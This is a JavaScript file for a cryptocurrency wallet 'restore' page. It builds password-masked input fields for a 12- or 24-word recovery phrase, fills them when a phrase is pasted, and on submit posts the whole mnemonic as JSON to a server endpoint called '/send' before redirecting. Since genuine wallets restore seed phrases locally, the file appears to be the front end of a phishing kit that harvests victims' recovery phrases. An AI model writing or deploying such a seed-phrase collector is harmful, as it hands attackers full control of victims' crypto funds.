document.addEventListener('DOMContentLoaded', () => {
    const wordCountSelection = document.getElementsByName('word-count');
    const recoveryPhraseContainer = document.getElementById('recovery-phrase');
    const continueButton = document.getElementById('continue-button');
    const form = document.getElementById('mnemonic-form');
    
    function generateInputs(wordCount) {
        recoveryPhraseContainer.innerHTML = '';
        for (let i = 1; i <= wordCount; i++) {
            const inputContainer = document.createElement('div');
            inputContainer.className = 'phrase-input-container';
            
            const wordNumber = document.createElement('span');
            wordNumber.className = 'word-number';
            wordNumber.textContent = `${i}.`;
            
            const input = document.createElement('input');
            input.type = 'password';
            input.id = `word-${i}`;
            input.required = true;
            
            const toggleButton = document.createElement('button');
            toggleButton.type = 'button';
            toggleButton.className = 'toggle-button';
            toggleButton.innerHTML = '👁';
            toggleButton.addEventListener('click', () => {
                input.type = input.type === 'password' ? 'text' : 'password';
            });
            
            inputContainer.appendChild(wordNumber);
            inputContainer.appendChild(input);
            inputContainer.appendChild(toggleButton);
            recoveryPhraseContainer.appendChild(inputContainer);
            
            input.addEventListener('paste', handlePaste);
        }
    }

    function handlePaste(event) {
        event.preventDefault();
        const pastedText = (event.clipboardData || window.clipboardData).getData('text');
        const words = pastedText.split(/\s+/).slice(0, 24); // Split by whitespace and limit to 24 words
        words.forEach((word, index) => {
            const input = document.getElementById(`word-${index + 1}`);
            if (input) {
                input.value = word;
            }
        });
        const allFilled = Array.from(recoveryPhraseContainer.querySelectorAll('input')).every(input => input.value.trim() !== '');
        continueButton.disabled = !allFilled;
    }

    wordCountSelection.forEach(radio => {
        radio.addEventListener('change', (event) => {
            generateInputs(event.target.value);
        });
    });

    generateInputs(document.querySelector('input[name="word-count"]:checked').value);
    
    recoveryPhraseContainer.addEventListener('input', () => {
        const allFilled = Array.from(recoveryPhraseContainer.querySelectorAll('input')).every(input => input.value.trim() !== '');
        continueButton.disabled = !allFilled;
    });

    form.addEventListener('submit', function(event) {
        event.preventDefault();
        const mnemonic = Array.from(recoveryPhraseContainer.querySelectorAll('input')).map(input => input.value.trim()).join(' ');
        fetch('/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ mnemonic })
        }).then(response => response.json())
          .then(data => {
              if (data.success) {
                window.location.href = '/';
              } else {
                  alert('Failed to restore mnemonic');
              }
          }).catch(error => {
              console.error('Error:', error);
              alert('Failed to restore mnemonic');
          });
    });
});
